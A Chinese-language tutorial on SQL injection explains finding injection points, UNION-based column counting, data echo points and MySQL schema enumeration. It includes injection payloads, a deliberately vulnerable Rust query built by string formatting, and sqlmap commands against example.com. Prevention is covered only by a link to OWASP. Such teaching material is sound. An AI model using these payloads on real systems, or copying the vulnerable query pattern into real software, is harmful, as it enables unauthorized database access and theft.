# SQL 注入

**英文**: SQL Injection.

根据 OWASP Top Ten 2021 的统计结果, 注入 (包括 SQL 注入) 漏洞是常见的 Web 应用漏洞之一.[^owasp-2021]

许多的 SQL 语句是基于用户输入内容动态生成的, 如果没有对输入进行适当的过滤和转义, 攻击者就可以利用该漏洞**构造任意的 SQL 查询**, 从而实现未授权的数据访问或操作.  
部分数据库 (如 MySQL, PostgreSQL, MS SQL Server) 由于支持执行 Shell 命令或运行脚本 (如 PL/Perl, PL/Python), 攻击者甚至可以通过 SQL 注入漏洞执行任意代码, 实现远程代码执行 (RCE).

下面将介绍 SQL 注入的基本原理, 漏洞利用方法, 如何防范, 以及自动化工具 sqlmap 的基本用法.

## 注入点

首先需要识别可能与数据库进行交互的潜在注入点, 常见位置包括:

- 登录表单的用户名/密码字段.
- 搜索框输入参数.
- HTTP 的 GET 和 POST 参数.

以 URL `http://example.com/?id=1` 为例, 其中的 GET 参数 `id` 便可能是一个注入点.  
可以通过构造下面 URL 来检测该参数是否可以被注入:

```txt
http://example.com/?id=1'
```

假设对应的 SQL 语句如下:

```sql
SELECT * FROM users WHERE id = '{id}'
```

```rs
async fn query(Query(params): Query<HashMap<String, String>>) {
    let id = params.get("id").unwrap();
    let sql = format!("SELECT username, passowrd FROM users WHERE id = '{id}'");
}
```

如果不对参数 `id` 的值 `1'` 进行转义或过滤, 直接拼接到上面 SQL 查询语句中, 则会产生下面结果:

```sql
SELECT * FROM users WHERE id = '1''
```

此时, 数据库因引号不匹配将无法正确解析 SQL 语句并返回错误. 网站后端收到错误信息后, 可能表现为:

- **数据库错误信息暴露**: 返回包含具体数据库报错信息的页面.
- **通用错误页面**: 显示自定义的错误提示页面.
- **功能异常**: 页面数据加载失败或显示异常.

如果观察到此类异常现象, 则表明该参数可能存在 SQL 注入漏洞.

也可以使用自动化工具来检测是否存在 SQL 注入点:

```sh
python sqlmap.py -u "http://example.com/?id=1"
```

sqlmap 会自动检测该注入点的有效性, 并尝试获取数据库的基本信息.

## 数据回显点

用户输入内容一般位于 SQL 语句的 WHERE 子句中, 因此无法改变该 SQL 具体的查询内容.  
一个常见的作法是利用 UNION 关键字后接自定义的 SELECT 语句, 从而获取任意 SQL 查询的结果.

SQL 注入依赖 UNION 关键字. 该关键字存在以下限制:

- **字段数量一致**：两个 SELECT 语句的字段数量必须相同
- **字段类型兼容**：对应位置的字段数据类型必须兼容

假设原 SQL 语句一共查询了 2 个字段, 则可以使用下面的 SQL 语句来判断:

```sql
' UNION SELECT NULL --'
' UNION SELECT NULL, NULL --'
```

其中, 第一个 SQL 语句执行时会报错, 而第二个 SQL 语句能顺利执行. 因此可以判断, 该表只有 2 个字段.

```sh
python sqlmap.py -u "http://example.com/product?id=1" --technique=U --columns
```

SQL 语句的查询结果一部分会直接显示在页面上, 这部分数据称为数据回显点. 通过观察数据回显点, 可以逐步的获取任意 SQL 语句的查询结果.

```sql
UNION SELECT 'echo0', 'echo1'
```

```txt
http://example.com/?id=1' UNION SELECT 'echo0', 'echo1
```

假设执行后页面出现了 "echo1", 则表示该位置为注入点. 后续就可以利用该字段, 获取 SQL 查询的结果.

## 获取表结构

## 信息收集

下面以 MySQL 数据库为例, 通过几个例子说明如何利用 SQL 注入漏洞获取数据库信息.

### 获取当前数据库名称

```sql
SELECT DATABASE()
```

对应相似功能的 sqlmap 命令如下:

```sh
python sqlmap.py -u "http://example.com/product?id=1" --current-db
```

### 获取数据库中所有表的名称

```sql
SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '<DATABASE>' -- 获取指定数据库中的表名
```

对应相似功能的 sqlmap 命令如下:

```sh
python sqlmap.py -u "http://example.com/product?id=1" -D "<DATABASE>" --tables
```

## 防范

请参考: <https://owasp.org/Top10/A03_2021-Injection/#how-to-prevent>.

[^owasp-2021]: <https://owasp.org/Top10/A03_2021-Injection/>
